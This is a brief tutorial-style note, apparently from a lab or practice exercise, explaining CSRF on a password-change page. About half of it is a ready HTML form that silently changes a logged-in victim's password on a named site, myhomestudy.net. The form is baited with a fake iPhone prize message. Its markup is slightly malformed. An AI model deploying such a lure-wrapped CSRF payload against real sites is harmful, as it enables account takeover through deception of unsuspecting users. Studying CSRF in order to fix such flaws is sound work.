CSRF is an attack that forces a victim to execute unwanted action when they're currently authenticated in a website.

If the action(change_password.php) has CSRF
e.g. New password _________________
     Repeat the password __________

It doesn't need old password, so that It must have CSRF.

We create a CSRF form html to make a victim to click. When the victim clicks, victim password is changed.

<center><h1>We have a winnner for an IPHONE 15 pro MAX</center></h1>
<html>
  <body>
      <form method="POST" action="https://myhomestudy.net/change_password.php"
          <input type="hidden" name="password" value="nightmare"/>
          <input type="hidden" name="re_password" value="nightmare"/>
          <input type="hidden" name="submit" value="Save"/>
          <input type="submit" value="submit">
      </form>
  </body>
</html>

If the login_victim clicks that submit button, victim password will automatically change in myhomestudy.net website.
